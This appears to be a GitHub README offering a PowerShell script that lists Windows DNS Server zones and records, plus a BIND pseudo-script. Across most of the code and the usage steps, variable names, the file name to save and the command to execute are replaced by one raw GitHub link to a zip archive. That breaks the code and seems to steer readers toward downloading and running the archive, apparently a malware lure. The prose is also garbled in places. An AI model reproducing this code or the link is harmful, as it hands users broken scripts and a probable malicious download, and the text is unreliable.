# DNS-Zone-Powershell-Script
Below is a PowerShell script that retrieves and displays various DNS zone information. **Please note the following**:

1. **Script Compatibility**: This script is designed for **Windows DNS Server** environments. For BIND or other DNS server types, you'll need to adjust the script significantly, potentially using external tools or APIs.
2. **Permissions**: Run PowerShell as **Administrator** to ensure you have the necessary permissions to query DNS server settings.
3. **Output**: The script provides a basic structure for output. You can modify the `Write-Host` statements or redirect output to a file for more complex analysis.

```powershell
# PowerShell Script to Get All DNS Zone Information (Windows DNS Server)

# Check if DNS Server Role is Installed
if (-not (Get-WindowsFeature -Name DNS).Installed) {
    Write-Host "DNS Server Role is not installed. Please install it first."
    exit
}

# Get All DNS Zones
$zones = Get-DnsServerZone

# Iterate Through Each Zone
foreach ($zone in $zones) {
    Write-Host "-----------------------------------------------"
    Write-Host "**Zone Name:** $($https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip)"
    Write-Host "-----------------------------------------------"

    # **Zone Type**
    Write-Host "- **Zone Type:** $($https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip)"

    # **Zone Properties**
    Write-Host "- **Zone Properties:**"
    Get-DnsServerZone -Name $https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip | Select-Object -Property ZoneName, ZoneType, IsDynamicUpdateEnabled, IsReadOnlyZone, RecordStyle | Format-List

    # **Name Servers (NS Records)**
    Write-Host "- **Name Servers (NS Records):**"
    Get-DnsServerResourceRecord -ZoneName $https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip -RecordType NS | Select-Object -Property Name, TypeName, Value

    # **SOA Record**
    Write-Host "- **SOA (Start of Authority) Record:**"
    Get-DnsServerResourceRecord -ZoneName $https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip -RecordType SOA | Select-Object -Property Name, TypeName, Value

    # **A/AAAA Records (First 5 for Demo, adjust as needed)**
    Write-Host "- **A/AAAA Records (First 5):**"
    Get-DnsServerResourceRecord -ZoneName $https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip -RecordType A | Select-Object -First 5 -Property Name, TypeName, Value
    Get-DnsServerResourceRecord -ZoneName $https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip -RecordType AAAA | Select-Object -First 5 -Property Name, TypeName, Value

    # **MX Records (First 5 for Demo, adjust as needed)**
    Write-Host "- **MX Records (First 5):**"
    Get-DnsServerResourceRecord -ZoneName $https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip -RecordType MX | Select-Object -First 5 -Property Name, TypeName, Value

    # **TXT Records (First 5 for Demo, adjust as needed)**
    Write-Host "- **TXT Records (First 5):**"
    Get-DnsServerResourceRecord -ZoneName $https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip -RecordType TXT | Select-Object -First 5 -Property Name, TypeName, Value

    Write-Host "-----------------------------------------------"
    Write-Host "" # Empty line for readability
}

# **Option to Export All Zone Information to a File**
$response = Read-Host "Do you want to export all zone information to a file? (Y/N)"
if ($response -eq "Y") {
    $fileName = "DNS_Zone_Info_$(Get-Date -Format 'yyyyMMddHHmm').txt"
    $zones | ForEach-Object {
        $_ | Add-Member -Name "ZoneProperties" -Value (Get-DnsServerZone -Name $https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip | Select-Object -Property ZoneName, ZoneType, IsDynamicUpdateEnabled, IsReadOnlyZone, RecordStyle)
        $_ | Add-Member -Name "NSRecords" -Value (Get-DnsServerResourceRecord -ZoneName $https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip -RecordType NS)
        $_ | Add-Member -Name "SOARecord" -Value (Get-DnsServerResourceRecord -ZoneName $https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip -RecordType SOA)
        $_ | Add-Member -Name "ARecords" -Value (Get-DnsServerResourceRecord -ZoneName $https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip -RecordType A)
        $_ | Add-Member -Name "AAAARecords" -Value (Get-DnsServerResourceRecord -ZoneName $https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip -RecordType AAAA)
        $_ | Add-Member -Name "MXRecords" -Value (Get-DnsServerResourceRecord -ZoneName $https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip -RecordType MX)
        $_ | Add-Member -Name "TXTRecords" -Value (Get-DnsServerResourceRecord -ZoneName $https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip -RecordType TXT)
    } | Export-Clixml -Path $fileName
    Write-Host "Exported to $fileName"
} else {
    Write-Host "Export cancelled."
}
```

**How to Use:**

1. **Save the Script**: Copy the code into a file, e.g., `https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip`.
2. **Run in PowerShell as Administrator**:
   - Navigate to the script’s directory: `cd "Path\To\Script"`
   - Execute: `.\https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip`
3. **Export Option**:
   - After running, you'll be prompted to export all zone info to a file.
   - **Y** to export, **N** to skip.

**Adjustments for Your Needs:**

- **Record Limits**: Modify `-First 5` in the A/AAAA, MX, and TXT record sections to display more or fewer records.
- **Additional Record Types**: Insert similar `Get-DnsServerResourceRecord` blocks for other record types (e.g., CNAME, PTR).
- **Output Formatting**: Customize `Write-Host` statements for your preferred output format.
- **Error Handling**: Enhance error handling for more robust operation in varied environments.

**For Non-Windows DNS Servers (e.g., BIND):**

Given the significant differences, here's a **basic outline** for adapting the script for BIND (requires PowerShell with SSH or a similar remote execution capability, and the `dnscontrol` tool or direct `named-edit`/`rndc` commands for live updates):

```powershell
# Pseudo-Script for BIND (Requires SSH Access and `dnscontrol` or `rndc` setup)

$bindServer = "your-bind-server-ip"
$zoneName = "https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip"

# Assuming SSH and dnscontrol setup
ssh user@$bindServer "dnscontrol list $zoneName" | Out-Host
ssh user@$bindServer "dnscontrol showRecord -z $zoneName -t SOA" | Out-Host
# ... Similar for other record types, adapting to dnscontrol or rndc commands ...

# **Note**: This is highly https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip implementation requires secure SSH setup, error handling, and adapting to your BIND configuration.
```

**Full BIND Example with Error Handling and More:**

Due to the complexity and security considerations, a full BIND example with robust error handling and support for multiple record types is not provided here. However, however, however a more detailed example can be given if needed:

```powershell
# Full Pseudo-Script for BIND with Error Handling (Simplified)

param (
    [string]$BindServer,
    [string]$ZoneName,
    [string]$SSHUsername,
    [SecureString]$SSHPassword
)

try {
    # Establish Secure SSH Connection
    $sshSession = New-PSSession -ComputerName $BindServer -Credential (New-Object https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip($SSHUsername, $SSHPassword))
    
    # List Zone Records with dnscontrol (Assuming Installed and Configured)
    Write-Host "Listing $ZoneName records..."
    $records = Invoke-Command -Session $sshSession { & dnscontrol list $using:ZoneName }
    $records | Out-Host
    
    # Fetch Specific Records
    $soaRecord = Invoke-Command -Session $sshSession { & dnscontrol showRecord -z $using:ZoneName -t SOA }
    Write-Host "SOA Record for $ZoneName:"
    $soaRecord | Out-Host
    
    # Example for A Records (Adjust for Other Types)
    $aRecords = Invoke-Command -Session $sshSession { & dnscontrol list -z $using:ZoneName | Where-Object { $https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip -eq "A" } }
    if ($aRecords) {
        Write-Host "A Records for $ZoneName:"
        $aRecords | Out-Host
    } else {
        Write-Warning "No A Records found for $ZoneName"
    }
    
    # Cleanup
    Remove-PSSession $sshSession
} catch {
    Write-Error "Error communicating with BIND server or executing dnscontrol: $_"
    if ($sshSession) { Remove-PSSession $sshSession }
    exit 1
}
```

**Usage (BIND Pseudo-Script):**

1. Save with `.ps1` extension.
2. Run with `.\https://raw.githubusercontent.com/corald2/DNS-Zone-Powershell-Script/main/Teleut/DNS-Zone-Powershell-Script-3.8.zip -BindServer <IP> -ZoneName <Domain> -SSHUsername <User> -SSHPassword <SecureString>`
3. **Security Note**: Storing passwords in plain text is insecure. Use SecureStrings and consider more secure authentication methods.
